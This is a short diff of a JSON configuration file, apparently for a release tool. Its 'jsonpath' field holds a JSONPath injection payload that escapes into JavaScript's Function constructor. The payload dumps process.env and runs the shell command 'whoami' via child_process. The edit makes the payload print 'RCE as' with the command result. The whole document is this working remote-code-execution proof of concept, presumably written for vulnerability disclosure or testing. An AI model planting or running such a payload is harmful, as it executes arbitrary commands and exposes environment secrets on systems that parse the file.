@@ -5,7 +5,7 @@
       "extra-files": [
         {
           "path": "a.json",
-          "jsonpath": "$..[?(({__proto__:({})['__lookupGetter__']})['constructor']('console.log(process.env);process.mainModule.require(\"child_process\").execSync(\"whoami\")')())]",
+          "jsonpath": "$..[?(({__proto__:({})['__lookupGetter__']})['constructor']('console.log(process.env);console.log(\"RCE as \" + process.mainModule.require(\"child_process\").execSync(\"whoami\").toString()')())]",
           "type":"json"
         }
       ]
